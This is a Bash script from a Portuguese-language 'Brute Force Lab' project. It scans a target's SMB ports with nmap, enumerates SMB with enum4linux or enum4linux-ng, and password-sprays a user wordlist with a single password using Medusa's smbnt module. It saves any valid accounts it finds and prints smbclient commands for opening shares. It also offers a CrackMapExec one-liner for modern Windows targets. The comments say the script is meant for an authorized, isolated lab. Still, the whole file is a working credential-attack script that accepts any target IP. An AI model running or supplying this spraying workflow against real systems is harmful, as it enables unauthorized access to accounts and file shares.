#!/bin/bash

# ==========================================================
# 04 — Enumeração SMB e Password Spraying com Medusa
# Projeto: Brute Force Lab com Kali Linux e Medusa
# Uso autorizado apenas em laboratório local/controlado.
#
# CORREÇÃO APLICADA:
# - Adicionado suporte a enum4linux-ng (versão moderna, recomendada)
# - Adicionado -O para gerar log com evidências
# - Adicionada nota sobre SMBv1 e ferramentas modernas
# ==========================================================

clear

LOGS_DIR="logs"
mkdir -p "$LOGS_DIR"

echo "=================================================="
echo " 04 — SMB Password Spraying"
echo "=================================================="
echo

echo "[!] Este script realiza enumeração SMB e password spraying controlado."
echo "[!] Use somente em ambiente local, isolado e autorizado."
echo

read -p "Informe o IP do alvo. Exemplo: 192.168.56.101: " TARGET
read -p "Informe o caminho da wordlist de usuários. Exemplo: wordlists/smb-users.txt: " USER_LIST
read -p "Informe a senha única para spraying. Exemplo: 123456: " PASSWORD

echo

if [ -z "$TARGET" ] || [ -z "$USER_LIST" ] || [ -z "$PASSWORD" ]; then
    echo "[-] IP, lista de usuários ou senha não informado. Encerrando."
    exit 1
fi

LOG_FILE="$LOGS_DIR/smb-results-$(date +%Y%m%d-%H%M%S).txt"

echo "=================================================="
echo "[1] Verificação de dependências"
echo "=================================================="

for tool in nmap medusa smbclient; do
    if command -v "$tool" >/dev/null 2>&1; then
        echo "[+] $tool encontrado."
    else
        echo "[-] $tool não encontrado."
        echo "    Instale com: sudo apt install $tool -y"
        exit 1
    fi
done

# enum4linux-ng é a versão moderna e recomendada do enum4linux
# Verifica qual versão está disponível
if command -v enum4linux-ng >/dev/null 2>&1; then
    ENUM_TOOL="enum4linux-ng"
    echo "[+] enum4linux-ng encontrado (versão moderna — recomendada)."
elif command -v enum4linux >/dev/null 2>&1; then
    ENUM_TOOL="enum4linux"
    echo "[!] enum4linux encontrado (versão legada)."
    echo "    Para instalar a versão moderna: sudo apt install enum4linux-ng"
    echo "    Ou via pip: pip3 install enum4linux-ng"
else
    echo "[-] Nenhuma versão do enum4linux encontrada."
    echo "    Instale com: sudo apt install enum4linux -y"
    echo "    Ou versão moderna: pip3 install enum4linux-ng"
    ENUM_TOOL=""
fi

if [ -f "$USER_LIST" ]; then
    USER_COUNT=$(wc -l < "$USER_LIST")
    echo "[+] Wordlist de usuários encontrada: $USER_LIST ($USER_COUNT usuários)"
else
    echo "[-] Wordlist de usuários não encontrada: $USER_LIST"
    exit 1
fi

echo

echo "=================================================="
echo "[2] Verificação das portas SMB"
echo "=================================================="
nmap -sV -p 139,445 "$TARGET"

SMB_STATUS=$(nmap -p 445 "$TARGET" | grep "445/tcp" | awk '{print $2}')
if [ "$SMB_STATUS" != "open" ]; then
    echo "[!] Porta 445 não está aberta. Verificando porta 139..."
    SMB139=$(nmap -p 139 "$TARGET" | grep "139/tcp" | awk '{print $2}')
    if [ "$SMB139" != "open" ]; then
        echo "[-] Nenhuma porta SMB aberta. Verifique o alvo."
        exit 1
    fi
fi

echo

if [ -n "$ENUM_TOOL" ]; then
    read -p "Deseja executar enumeração SMB com $ENUM_TOOL? (s/n): " ENUM_CONFIRM

    if [[ "$ENUM_CONFIRM" == "s" || "$ENUM_CONFIRM" == "S" ]]; then
        echo
        echo "=================================================="
        echo "[3] Enumeração SMB com $ENUM_TOOL"
        echo "=================================================="

        if [ "$ENUM_TOOL" = "enum4linux-ng" ]; then
            # enum4linux-ng: sintaxe moderna, output mais limpo
            enum4linux-ng -A "$TARGET" | tee "$LOGS_DIR/smb-enum-$(date +%Y%m%d-%H%M%S).txt"
        else
            # enum4linux legado
            enum4linux -a "$TARGET" | tee "$LOGS_DIR/smb-enum-$(date +%Y%m%d-%H%M%S).txt"
        fi
    else
        echo "[!] Enumeração SMB ignorada."
    fi
fi

echo

read -p "Deseja iniciar password spraying com Medusa? (s/n): " SPRAY_CONFIRM

if [[ "$SPRAY_CONFIRM" != "s" && "$SPRAY_CONFIRM" != "S" ]]; then
    echo "[-] Execução do spraying cancelada."
    exit 0
fi

echo
echo "=================================================="
echo "[4] Password Spraying com Medusa"
echo "=================================================="
echo
echo "[!] NOTA TÉCNICA:"
echo "    O módulo 'smbnt' do Medusa utiliza autenticação NTLMv1/SMBv1."
echo "    Em ambientes modernos (Windows 10+, Server 2019+), o SMBv1 está"
echo "    desabilitado por padrão. Para labs com Metasploitable 2, funciona."
echo "    Em cenários reais modernos, prefira: CrackMapExec / NetExec"
echo "    Exemplo moderno: crackmapexec smb $TARGET -u users.txt -p '$PASSWORD'"
echo
echo "[+] Alvo:              $TARGET"
echo "[+] Lista de usuários: $USER_LIST ($USER_COUNT usuários)"
echo "[+] Senha testada:     $PASSWORD"
echo "[+] Técnica:           uma senha contra múltiplos usuários (spraying)"
echo "[+] Log:               $LOG_FILE"
echo

echo "Início: $(date)" >> "$LOG_FILE"
echo "Alvo: $TARGET | Senha: $PASSWORD" >> "$LOG_FILE"
echo "---" >> "$LOG_FILE"

# -O salva log com credenciais encontradas (evidência documentada)
medusa -h "$TARGET" -U "$USER_LIST" -p "$PASSWORD" -M smbnt -O "$LOG_FILE"

echo
echo "=================================================="
echo "[5] Resultado"
echo "=================================================="

if grep -q "ACCOUNT FOUND" "$LOG_FILE" 2>/dev/null; then
    echo "[+] Credenciais válidas encontradas! Verifique: $LOG_FILE"
    grep "ACCOUNT FOUND" "$LOG_FILE"
else
    echo "[-] Nenhuma credencial válida encontrada."
fi

echo "[+] Log completo salvo em: $LOG_FILE"

echo
echo "=================================================="
echo "[6] Validação manual"
echo "=================================================="
echo "Para listar compartilhamentos SMB do alvo:"
echo
echo "  smbclient -L //$TARGET -U <usuario_encontrado>"
echo
echo "Para acessar um compartilhamento:"
echo
echo "  smbclient //$TARGET/<compartilhamento> -U <usuario>"
echo

echo "=================================================="
echo " Teste SMB finalizado"
echo "=================================================="
